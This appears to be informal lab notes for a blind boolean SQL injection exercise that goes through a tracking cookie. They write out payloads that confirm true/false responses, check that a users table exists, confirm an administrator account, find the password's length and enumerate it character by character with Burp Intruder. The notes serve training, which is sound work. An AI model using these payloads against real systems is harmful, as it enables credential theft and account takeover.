to conform there is a false/true val from server:

you need to input the actual payload (' and 1=1--)
after the coockie num and before the ;

check if you have TRUE:

select tracking-id from tracking-table where trackingId = 
cookie num here ' and 1=1--

check if you have FALSE:

select tracking-id from tracking-table where trackingId = 
cookie num here ' and 1=0--

Now to check if there is a table called users:

select tracking-id from tracking-table where trackingId = 
cookie num here ' and (select 'x' from users LIMIT 1) = 'x'--

now there is an assumption here 
that there is a col named username
in the table users but iam pretty sure it easy
to check either way 

confirming that there is a user named 'administrator' 
inside the table 'users' inside the col 'username':

select tracking-id from tracking-table where trackingId = 
cookie num here ' and (select username from users where username='administrator') = 'administrator'--

now we need to find the length of the password:

select tracking-id from tracking-table where trackingId = 
cookie num here ' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--

so we found using burp intruder sniper attack that the length is 20 exactly (it returned false on '>20')

enumerate the first chr of the password (just an example of the code type, in actualty we will use burp or script to do this):

select tracking-id from tracking-table where trackingId = 
Dm1izhQKLBBsfF80 ' and (select substring(password,1,1) from users where username='administrator')='a'--
















